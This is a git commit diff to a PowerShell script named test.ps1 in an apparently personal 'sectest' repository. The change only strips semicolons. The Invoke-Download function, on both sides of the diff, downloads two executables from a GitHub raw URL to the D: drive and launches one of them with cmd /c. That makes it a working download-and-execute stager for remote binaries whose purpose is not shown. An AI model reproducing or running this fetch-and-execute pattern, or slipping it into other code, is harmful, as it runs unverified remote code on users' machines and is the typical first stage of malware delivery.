289be1cc24bbda7f5beeae5ba38a487654d5b958
foryou123 <hiforyou@yeah.net>
2018-03-21 16:50:44 +0800

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,16 +1,16 @@
 
 function Invoke-Download
 {
-  $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe";
-  $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe";
-  $des1 = "D:\\_59539.exe";
-  $des2 = "D:\\_VPN.exe";
-  $d = new-object System.Net.WebClient;
-  $d.Downloadfile($url1,$des1);
-  $d.Downloadfile($url2,$des2);
+  $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe"
+  $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe"
+  $des1 = "D:\\_59539.exe"
+  $des2 = "D:\\_VPN.exe"
+  $d = new-object System.Net.WebClient
+  $d.Downloadfile($url1,$des1)
+  $d.Downloadfile($url2,$des2)
   
   #Invoke-WebRequest -uri $url1 -OutFile $des1
   #Invoke-WebRequest -uri $url2 -OutFile $des2
   #$cmd="D:\\_VPN.exe"
-  cmd /c "D:\\_VPN.exe";
+  cmd /c "D:\\_VPN.exe"
 }
